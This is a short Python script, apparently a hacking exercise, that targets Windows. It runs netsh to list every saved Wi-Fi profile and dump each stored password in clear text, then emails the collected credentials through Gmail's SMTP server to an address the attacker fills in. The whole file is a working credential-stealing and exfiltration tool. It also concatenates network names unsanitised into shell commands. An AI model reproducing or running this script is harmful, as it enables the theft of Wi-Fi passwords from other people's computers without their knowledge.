
# This only works against windows

import subprocess
import re
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
raw_networks = subprocess.check_output(command, shell=True)
networks_list = re.findall(r"(?:Profile\s*:\s)(.*)", raw_networks)


info = ""

for network in networks_list:
    command = "netsh wlan show profile " + network + " key=clear"
    net_info = subprocess.check_output(command, shell=True)
    info += net_info

your_mail = ""
your_password = ""
send_mail(your_mail, your_password, info)
